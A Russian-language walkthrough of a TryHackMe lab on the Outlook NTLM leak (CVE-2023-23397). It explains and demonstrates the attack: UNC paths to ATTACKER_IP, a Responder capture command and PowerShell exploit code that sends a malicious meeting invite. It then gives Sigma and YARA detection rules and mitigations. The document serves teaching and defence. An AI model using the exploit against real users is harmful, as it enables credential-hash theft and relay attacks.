

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Outlook NTLM Leak](https://tryhackme.com/r/room/outlookntlmleak) 

Всего 6 заданий:
## Задание 1
Во вторник, 14 марта, Microsoft выпустила 83 исправления безопасности во вторник исправлений, включая CVE-2023-23397. Эта критическая уязвимость затрагивает все версии настольного приложения Outlook в любой системе Windows. Веб-приложение Outlook (OWA) и Microsoft 365 не уязвимы, поскольку они не поддерживают аутентификацию NTLM .

В отличие от большинства эксплойтов, этот особенно опасен, поскольку он является эксплойтом с нулевым щелчком, то есть для его активации не требуется никакого взаимодействия с пользователем. Как только зараженное письмо поступает в почтовый ящик пользователя, злоумышленник может получить конфиденциальные хэши учетных данных Net-NTLMv2. Как только злоумышленники получают эти хэши, они могут получить учетные данные пользователя, аутентифицироваться в своей системе и повысить привилегии.

Запуск виртуальной машины

Чтобы развернуть  присоединенную  виртуальную машину , нажмите зеленую Start Machine кнопку в верхней части задачи. Машина должна запуститься в режиме разделенного экрана. Если этого не произошло, вы можете нажать синюю Show Split Viewкнопку в правом верхнем углу этой страницы. Все пространство можно просмотреть в режиме разделенного экрана, но если вы предпочитаете подключаться к машине через RDP , вы можете использовать следующие учетные данные:

ТМ-ключ
Имя пользователя	Администратор
Пароль	Пароль321
На вашей виртуальной машине установлена ​​пробная версия Outlook, поэтому смело игнорируйте любые сообщения об активации. При открытии Outlook вы также можете без проблем закрыть экран «Войти для настройки Office», чтобы продолжить:

Войти в офис

Вам также понадобится использовать AttackBox, поэтому сейчас самое время нажать Start AttackBoxкнопку в верхней части комнаты.

### Ответьте на вопросы ниже
Запустите виртуальную машину и продолжайте обучение!

```commandline
Ответ не нужен
```

## Задание 2
Оповещения о встречах в Outlook

В Outlook можно добавлять напоминания при отправке приглашений календаря:

Перспективы назначений

Вы можете указать аудиофайл, который будет воспроизводиться, когда пользователь получает напоминание о встрече или событии в календаре. Обычно это используется для того, чтобы пользователь мог настроить собственные уведомления, указав на аудиофайл:

Конфигурация звука напоминания

Манипулируя этим параметром, злоумышленник может заставить Outlook передать злоумышленнику текущие хэши паролей без какого-либо вмешательства.

Злоупотребление звуками напоминаний через пути UNC

Чтобы воспользоваться этой уязвимостью, злоумышленник должен создать вредоносное приглашение в календарь, которое включает ссылку на звуковой файл, указывающий на файл в сетевом ресурсе на компьютере злоумышленника. На низком уровне электронное письмо Outlook сохраняет ссылку на звуковой файл во внутреннем параметре PidLidReminderFileParameter . Чтобы гарантировать, что аудио, которое мы встраиваем в наше вредоносное электронное письмо, будет иметь приоритет над конфигурациями напоминаний жертвы по умолчанию, нам также нужно будет установить другой параметр PidLidReminderOverride в значение true.

Чтобы настроить свойство PidLidReminderFileParameter так, чтобы оно указывало на сетевой ресурс, злоумышленник может указать путь в формате Universal Naming Convention (UNC) вместо локального файла. UNC используется в операционных системах Windows для поиска сетевых ресурсов (файлов, принтеров, общих документов). Эти пути состоят из двойной обратной косой черты, IP-адреса или имени компьютера, на котором размещен ресурс, имени ресурса и имени файла. Например:

`\\ATTACKER_IP\foo\bar.wav`

Когда жертва получает вредоносное письмо, путь UNC направляет ее на этот общий ресурс SMB, активируя уязвимость. Это заставляет систему запустить процесс аутентификации NTLM против машины злоумышленника, раскрывая хэш Net-NTLMv2, который злоумышленник может позже попытаться взломать.

Использование уязвимости

Если по какой-то причине протокол SMB не является приемлемой альтернативой для использования, несерверные версии Windows будут принимать использование путей UNC, указывающих на порты 80 или 443, и использовать HTTP для извлечения файла с веб-сервера с поддержкой WebDAV. Синтаксис такого пути UNC следующий:
```commandline
\\ATTACKER_IP@80\foo\bar.wav

\\ATTACKER_IP@443\foo\bar.wav
```


Это может быть полезно для обхода ограничений брандмауэра, запрещающих исходящие соединения с портом 445 ( SMB ).

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!

```commandline
Ответ не нужен
```

## Задание 3
Теперь, когда мы понимаем, как работает уязвимость, давайте создадим вредоносное электронное письмо, содержащее запись на прием с необходимыми параметрами для ее активации.

Настройка Респондера

Поскольку мы ожидаем, что жертва инициирует попытку аутентификации против злоумышленника на порту 445, мы настроим Responder для обработки процесса аутентификации и захвата хэша NetNTLM для нас. Если вы не знакомы с Responder, он просто эмулирует сервер SMB и захватывает любую попытку аутентификации против него.

Чтобы запустить Responder для прослушивания попыток аутентификации в вашем ens5интерфейсе, вы можете просто выполнить следующую команду в AttackBox:

Атакующий бокс
`root@attackbox$ responder -I ens5`
Теперь мы готовы инициировать попытку аутентификации через уязвимость Outlook.

Попытка вручную организовать злонамеренное назначение

В качестве первой попытки мы могли бы вручную создать встречу и отредактировать путь к звуковому файлу напоминания, чтобы он указывал на общую папку. Чтобы создать встречу, вам сначала нужно будет нажать на календарь, а затем на кнопку New Appointment на панели задач, как показано на изображении ниже:

Создание встреч

Мы создадим встречу, которая включает напоминание, установленное через 0 минут, чтобы оно сработало сразу после того, как жертва его получит. Мы также нажмем на опцию Звук, чтобы настроить звуковой файл напоминания:

Настройка напоминаний

Мы можем попробовать задать путь к звуковому файлу в формате UNC, указывающий на наш AttackBox, и нажать кнопку «ОК» следующим образом:

Попытка установить UNC-путь

Однако Outlook молча проигнорирует путь UNC и вернется к использованию файла WAV по умолчанию, в чем можно убедиться, вернувшись в диалоговое окно «Звук»:

Возврат к звуку по умолчанию

Поскольку Outlook не ожидает, что пользователи введут здесь UNC-путь, он, вероятно, отклонит нашу попытку как недопустимый вывод. Но не все надежды потеряны!

OutlookSpy спешит на помощь

Даже если Outlook не может установить звуковой файл напоминания в UNC-путь, мы можем использовать плагин OutlookSpy, чтобы добиться этого. Этот плагин позволит вам получить прямой доступ ко всем внутренним параметрам Outlook, включая звуковой файл напоминания.

Установщик OutlookSpy можно найти на рабочем столе вашего компьютера. Вам нужно будет установить его вручную, прежде чем продолжить. Обязательно закройте Outlook перед запуском установщика.

Чтобы просмотреть нашу текущую встречу из OutlookSpy, щелкните OutlookSpyвкладку, а затем CurrentItemкнопку на панели задач:

Примечание: обязательно нажмите кнопку CurrentItem в назначенной встрече, иначе вы можете изменить различные компоненты Outlook.

OutlookSpy

В этом окне вы можете увидеть параметры, связанные с напоминанием о встрече. Мы хотим установить параметр ReminderSoundFile на UNC-путь, который указывает на наш AttackBox, и установить ReminderOverrideDefault и ReminderPlaySound на true. Просто для справки, вот что делает каждый параметр:

ReminderPlaySound: логическое значение, указывающее, будет ли воспроизводиться звук вместе с напоминанием.
ReminderOverrideDefault : логическое значение, указывающее принимающему клиенту Outlook воспроизводить звук, указанный ReminderSoundFile , вместо звука по умолчанию.
ReminderSoundFile : строка с путем к звуковому файлу, который будет использоваться. Для нашего эксплойта это будет указывать на фиктивную общую папку в нашем AttackBox.
Мы можем использовать вкладку скрипта и следующий скрипт, чтобы изменить параметры на требуемые значения:

Изменение параметров электронной почты

Обязательно нажмите Runкнопку, чтобы изменения вступили в силу. Вы можете вернуться на Propertiesвкладку, чтобы проверить, что значения были изменены правильно. Наконец, сохраните встречу, чтобы добавить ее в календарь, убедившись, что напоминание установлено на 0 минут и что встреча соответствует текущему времени и дате, так как мы хотим, чтобы она сработала немедленно:

Сохранение встречи

Если все прошло так, как ожидалось, вы сразу же увидите всплывающее напоминание:

Всплывающее окно для записи на прием

И вы должны получить попытку аутентификации в консоли Responder на вашем AttackBox:

Хэш, захваченный ответчиком

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!

```commandline
Ответ не нужен
```

## Задание 4
Подводя итог шагам, необходимым для эксплуатации уязвимости, злоумышленнику необходимо:
- Создайте вредоносную встречу/совещание с настраиваемым звуком напоминания, указывающим на UNC-путь на компьютере злоумышленника.
- Отправьте жертве приглашение по электронной почте.
- Дождитесь напоминания, чтобы инициировать соединение с машиной злоумышленника.
- Захватите хэш Net-NTLMv2, используйте ретрансляцию аутентификации или извлеките выгоду любым другим способом.
Шаги 3 и 4 уже выполнены для нас Responder, но создание вредоносного назначения вручную немного утомительно. К 
  счастью, для нас доступно несколько эксплойтов, позволяющих создать и отправить вредоносное назначение.  

В этой задаче мы рассмотрим эксплойт, опубликованный Oddvar Moe , который, вероятно, самый простой для понимания и 
использования. Этот эксплойт Powershell использует COM-объекты Outlook для простого создания писем и встреч. Он 
содержит несколько функций, которые мы можем использовать:  

- Save-CalendarNTLMLeak: Эта функция создает вредоносную встречу и сохраняет ее в вашем собственном календаре. 
Полезно для целей тестирования.
- Send-CalendarNTLMLeak: эта функция создает вредоносную встречу и отправляет ее по электронной почте жертве. 
  Приглашение по электронной почте будет отправлено с текущего аккаунта Outlook по умолчанию.
#### Анализ кода эксплойта

Оба варианта создают встречу одинаково, поэтому мы рассмотрим только Save-CalendarNTLMLeak . 

Сначала мы создадим объект «Outlook.Application» и создадим встречу.
```commandline
$Outlook = New-Object -comObject Outlook.Application
$newcal = $outlook.CreateItem('olAppointmentItem')
```

Будут установлены обычные параметры встречи. Они включают получателей, тему встречи, место, текст и даты начала и окончания. Эксплойт устанавливает начальный день на текущее время, чтобы напоминание сработало немедленно:
```commandline
$newcal.Recipients.add($recipient)
$newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
$newcal.Subject = $meetingsubject
$newcal.Location = "Virtual"
$newcal.Body = $meetingbody
$newcal.Start = get-date
$newcal.End = (get-date).AddHours(2)
```

Следующие дополнительные параметры будут настроены для направления звукового файла напоминания на сервер злоумышленника, как объяснялось ранее:
```commandline
$newcal.ReminderSoundFile = $remotefilepath
$newcal.ReminderOverrideDefault = 1
$newcal.ReminderSet = 1
$newcal.ReminderPlaysound = 1
```

Наконец, запись на прием будет отправлена получателю по электронной почте:

`$newcal.send()`
Использование эксплойта

Вы можете импортировать функции эксплойта с помощью командлета Import-Module. После этого обе функции будут доступны в вашем текущем Powershell. Чтобы отправить электронное письмо с вредоносной встречей, вы можете просто выполнить следующую команду:

Powershell
```commandline
PS C:\> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop\> Import-Module .\CVE-2023-23397.ps1
PS C:\Users\Administrator\Desktop\> Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"

```
Обязательно замените ATTACKER_IP на IP-адрес вашего AttackBox в `-remotefilepath` параметре. Обратите внимание, что в 
этом случае вы используете эксплойт, чтобы отправить себе электронное письмо, так как у нас есть одна учетная запись на машине, но обычно вы нацеливаетесь на другие адреса электронной почты.

Поскольку эксплойт использует текущий экземпляр Outlook для отправки электронной почты, вы, скорее всего, получите несколько предупреждений с просьбой предоставить разрешение скрипту на отправку электронных писем от вашего имени. Обязательно нажмите «Разрешить» столько раз, сколько необходимо. Отметка флажка «Разрешить доступ на 10 минут» также должна помочь ускорить этот процесс:

Предупреждение о перспективах

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```

## Задание 5
Теперь, когда мы рассмотрели шаги по превращению CVE-2023-23397атаки в оружие для Outlook, давайте поговорим о нескольких способах обнаружения этой атаки в сети. Каждая атака оставляет шаблоны или артефакты, которые могут помочь команде обнаружения идентифицировать угрозы. Все зависит от видимости сети и источников журналов, которые собираются и обеспечивают очень важную видимость.

Здесь мы обсудим несколько способов обнаружения этой атаки на хост.

Правила Сигмы

Следующее правило Sigma обнаруживает, что Outlook инициирует подключение к общему ресурсу WebDav или SMB , что указывает на фазу после эксплуатации.

```commandline
title: CVE-2023-23397 Exploitation Attempt
id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
status: experimental
description: Detects outlook initiating connection to a WebDAV or SMB share, which
  could be a sign of CVE-2023-23397 exploitation.
author: Robert Lee @quantum_cookie
date: 2023/03/16
references:
- https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
tags:
- attack.credential_access
- attack.initial_access
- cve.2023.23397
logsource:
  service: security
  product: windows
  definition: 'Requirements: SACLs must be enabled for "Query Value" on the registry
    keys used in this rule'
detection:
  selection:
    EventID:
    - 4656
    - 4663
    ProcessName|endswith: \OUTLOOK.EXE
    Accesses|contains: Query key value
    ObjectName|contains|all:
    - \REGISTRY\MACHINE\SYSTEM
    - Services\
    ObjectName|endswith:
    - WebClient\NetworkProvider
    - LanmanWorkstation\NetworkProvider
  condition: selection
falsepositives:
- Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
  it's better to filter out those events before they reach the SIEM
level: critical
```
Это правило Sigma предназначено для обнаружения svchost.exe, порождающего rundll32.exe с такими аргументами команды, как C:\windows\system32\davclnt.dll,DavSetCookie, что указывает на фазу после эксплуатации/эксфильтрации.

```commandline
title: Suspicious WebDav Client Execution
id: 982e9f2d-1a85-4d5b-aea4-31f5e97c6555
status: experimental
description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
  like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of
  exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
  a sign of exploitation of CVE-2023-23397

  '
references:
- https://twitter.com/aceresponder/status/1636116096506818562
- https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/
- https://www.pwndefend.com/2023/03/15/the-long-game-persistent-hash-theft/
author: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)
date: 2023/03/16
tags:
- attack.exfiltration
- attack.t1048.003
- cve.2023.23397
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: \svchost.exe
    Image|endswith: \rundll32.exe
    CommandLine|contains: C:\windows\system32\davclnt.dll,DavSetCookie
    CommandLine|re: ://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
  filter_local_ips:
    CommandLine|contains:
    - ://10.
    - ://192.168.
    - ://172.16.
    - ://172.17.
    - ://172.18.
    - ://172.19.
    - ://172.20.
    - ://172.21.
    - ://172.22.
    - ://172.23.
    - ://172.24.
    - ://172.25.
    - ://172.26.
    - ://172.27.
    - ://172.28.
    - ://172.29.
    - ://172.30.
    - ://172.31.
    - ://127.
    - ://169.254.
  condition: selection and not 1 of filter_*
falsepositives:
- Unknown
level: high
```
Эти правила SIGMA можно преобразовать в инструмент обнаружения и мониторинга для поиска подозрительной активности журнала в сети. Чтобы узнать больше о правилах SIGMA, проверьте эту вводную комнату на Sigma .
Правило Яра

Правило YARA ищет шаблон в файлах на диске. Следующие три правила сообщества YARA могут использоваться для обнаружения подозрительного файла MSG на диске с двумя свойствами, обсуждаемыми в задачах выше.

```commandline
rule SUSP_EXPL_Msg_CVE_2023_23397_Mar23 {
   meta:
      description = "MSG file with a PidLidReminderFileParameter property, potentially exploiting CVE-2023-23397"
      author = "delivr.to, modified by Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
      date = "2023-03-15"
      modified = "2023-03-17"
      score = 60
      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
   strings:
      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
      /* PSETID_Appointment */
      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
      /* PSETID_Meeting */
      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
      /* PSETID Task */
      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
      /* PidLidReminderFileParameter */
      $rfp = { 1F 85 00 00 }
      /* \\ UNC path prefix - wide formatted */
      $u1 = { 00 00 5C 00 5C 00 }
      /* not MSI */
      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
   condition:
      uint32be(0) == 0xD0CF11E0
      and uint32be(4) == 0xA1B11AE1
      and 1 of ($psetid*)
      and $rfp
      and $u1
      and not 1 of ($fp*)
}

rule EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 {
   meta:
      description = "Detects suspicious .msg file with a PidLidReminderFileParameter property exploiting CVE-2023-23397 (modified delivr.to rule - more specific = less FPs but limited to exfil using IP addresses, not FQDNs)"
      author = "delivr.to, Florian Roth, Nils Kuhnert, Arnim Rupp, marcin@ulikowski.pl"
      date = "2023-03-15"
      modified = "2023-03-18"
      score = 75
      reference = "https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/"
      hash = "47fee24586cd2858cfff2dd7a4e76dc95eb44c8506791ccc2d59c837786eafe3"
      hash = "582442ee950d546744f2fa078adb005853a453e9c7f48c6c770e6322a888c2cf"
      hash = "6c0087a5cbccb3c776a471774d1df10fe46b0f0eb11db6a32774eb716e1b7909"
      hash = "7fb7a2394e03cc4a9186237428a87b16f6bf1b66f2724aea1ec6a56904e5bfad"
      hash = "eedae202980c05697a21a5c995d43e1905c4b25f8ca2fff0c34036bc4fd321fa"
      hash = "e7a1391dd53f349094c1235760ed0642519fd87baf740839817d47488b9aef02"
   strings:
      /* https://interoperability.blob.core.windows.net/files/MS-OXPROPS/%5bMS-OXPROPS%5d.pdf */
      /* PSETID_Appointment */
      $psetid_app = { 02 20 06 00 00 00 00 00 C0 00 00 00 00 00 00 46 }
      /* PSETID_Meeting */
      $psetid_meeting = { 90 DA D8 6E 0B 45 1B 10 98 DA 00 AA 00 3F 13 05 }
      /* PSETID Task */
      $psetid_task = { 03 20 06 00 00 00 00 00 c0 00 00 00 00 00 00 46 }
      /* PidLidReminderFileParameter */
      $rfp = { 1F 85 00 00 }
      /* \\ + IP UNC path prefix - wide formatted */
      $u1 = { 5C 00 5C 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 2E|3? 00 3? 00 2E|3? 00 3? 00 3? 00 2E) 00 (3? 00 3? 00 3? 00|3? 00 3? 00|3? 00) }
      /* \\ + IP UNC path prefix - regular/ascii formatted for Transport Neutral Encapsulation Format */
      $u2 = { 00 5C 5C (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 2E|3? 3? 2E|3? 3? 3? 2E) (3? 3? 3?|3? 3?|3?) }
      /* not MSI */
      $fp_msi1 = {84 10 0C 00 00 00 00 00 C0 00 00 00 00 00 00 46}
   condition:
      (
         uint16(0) == 0xCFD0 and 1 of ($psetid*)
         or
         uint32be(0) == 0x789F3E22
      )
      and any of ( $u* )
      and $rfp
      and not 1 of ($fp*)
}

rule EXPL_SUSP_Outlook_CVE_2023_23397_SMTP_Mail_Mar23 {
   meta:
      author = "Nils Kuhnert"
      date = "2023-03-17"
      description = "Detects suspicious *.eml files that include TNEF content that possibly exploits CVE-2023-23397. Lower score than EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 as we're only looking for UNC prefix."
      score = 60
      reference = "https://twitter.com/wdormann/status/1636491612686622723"
   strings:
      // From:
      $mail1 = { 0A 46 72 6F 6D 3A 20 }
      // To: 
      $mail2 = { 0A 54 6F 3A }
      // Received:
      $mail3 = { 0A 52 65 63 65 69 76 65 64 3A }
      // Indicates that attachment is TNEF
      $tnef1 = "Content-Type: application/ms-tnef" ascii
      $tnef2 = "\x78\x9f\x3e\x22" base64
      // Check if it's an IPM.Task
      $ipm = "IPM.Task" base64
      // UNC prefix in TNEF
      $unc = "\x00\x00\x00\x5c\x5c" base64
   condition:
      all of them
}
```
YARA уже установлена на машине. Файл правила YARA cve-2023-23397.yarи вредоносный файл MSG appointment.msgможно найти на рабочем столе. Откройте терминал и выполните следующую команду, чтобы запустить правило для файла MSG.
Powershell
```commandline
PS C:\USers\Administrator\Desktop> yara64 .\cve-2023-23397.yar.txt .\appointment.msg
SUSP_EXPL_Msg_CVE_2023_23397_Mar23 .\appointment.msg
EXPL_SUSP_Outlook_CVE_2023_23397_Exfil_IP_Mar23 .\appointment.msg
```

Чтобы узнать больше о YARA и использовании сопоставления с образцом, посетите этот вводный раздел на YARA .

Скрипт Powershell

Microsoft выпустила скрипт PowerShell CVE -2023-23397.ps1  , который будет проверять элементы обмена сообщениями Exchange, такие как Почта, Календарь и Задачи, чтобы увидеть, обнаружены ли IOC, связанные с атакой CVE -2023-23397. Скрипт можно использовать для аудита и очистки обнаруженных элементов.

Примечание: этот скрипт не может быть использован в данной лабораторной работе.

Смягчение

Эта уязвимость широко используется в дикой природе. Некоторые из рекомендуемых шагов, рекомендованных Microsoft  для смягчения и предотвращения этой атаки:

Добавьте пользователей в группу безопасности «Защищенные пользователи», которая запрещает использование NTLM в качестве механизма аутентификации.
Заблокируйте исходящий TCP 445/ SMB из вашей сети, чтобы избежать любых последующих подключений.
Используйте скрипт PowerShell , выпущенный Microsoft, для сканирования сервера Exchange с целью обнаружения любых попыток атаки.
Отключите службу WebClient, чтобы избежать подключения WebDAV.
### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```
## Задание 6
В этой комнате мы экспериментировали с тем, как простая уязвимость может позволить злоумышленнику получить доступ к 
материалам аутентификации без необходимости какого-либо взаимодействия со стороны жертвы, отправив простое, 
специально созданное электронное письмо. Утечки NTLM не являются чем-то новым в средах Windows, но наличие одной из 
них в таком распространенном приложении, как Outlook, делает это особенно важным.   

Хотя мы использовали уязвимость для захвата и взлома хеша Net-NTLMv2, тот факт, что мы можем инициировать попытку 
аутентификации от имени жертвы, также позволяет проводить другие типы атак через ретранслятор, при которых взлом 
хеша даже не требуется.  

Как всегда, чтобы не стать жертвой подобной атаки, лучшей рекомендацией будет поддерживать актуальность установки 
Outlook, поскольку исправления уже доступны на сайте Microsoft.

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)